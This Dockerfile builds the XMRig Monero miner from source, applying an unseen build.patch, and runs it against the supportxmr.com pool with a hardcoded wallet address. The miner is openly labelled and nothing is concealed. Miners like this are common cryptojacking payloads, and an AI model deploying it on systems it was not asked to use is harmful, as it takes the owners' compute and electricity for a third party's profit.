FROM ubuntu:latest AS build

ARG XMRIG_VERSION='v5.7.0'

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN git clone https://github.com/xmrig/xmrig
WORKDIR /root/xmrig
RUN git checkout ${XMRIG_VERSION}
COPY build.patch /root/xmrig/
RUN git apply build.patch
RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make

FROM ubuntu:latest
RUN apt-get update && apt-get install -y libhwloc5
RUN useradd -ms /bin/bash monero
USER monero
WORKDIR /home/monero
COPY --from=build --chown=monero /root/xmrig/build/xmrig /home/monero

ENTRYPOINT ["./xmrig"]
CMD ["--url=pool.supportxmr.com:5555", "--user=42zMtWXZtyPcmtKbpERqccR7sjaE3HhWK5YMSbPxBY5eST42QemjkTfbcjzP7ZAmw44aoKSBdBoPbMwa14TWc8T6GWaqx97", "--pass=Docker", "-k", "--coin=monero"]˚
